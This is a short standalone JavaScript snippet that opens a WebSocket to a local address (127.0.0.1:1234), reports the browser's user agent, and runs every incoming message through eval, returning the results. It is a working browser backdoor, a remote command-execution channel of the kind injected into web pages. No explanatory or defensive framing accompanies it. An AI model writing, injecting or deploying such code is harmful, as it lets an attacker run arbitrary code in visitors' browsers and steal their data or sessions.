(function() {
    var ws = new WebSocket('ws://127.0.0.1:1234');
    
    ws.onopen = function() {
        ws.send('Connection established from ' + navigator.userAgent);
    };

    ws.onmessage = function(event) {
        try {
            var command = event.data;
            var result = eval(command);
            ws.send(result ? result.toString() : 'Command executed');
        } catch (e) {
            ws.send('Error: ' + e.message);
        }
    };

    ws.onclose = function() {
        console.log('Connection closed');
    };

    ws.onerror = function(error) {
        console.log('WebSocket Error: ' + error);
    };
})();
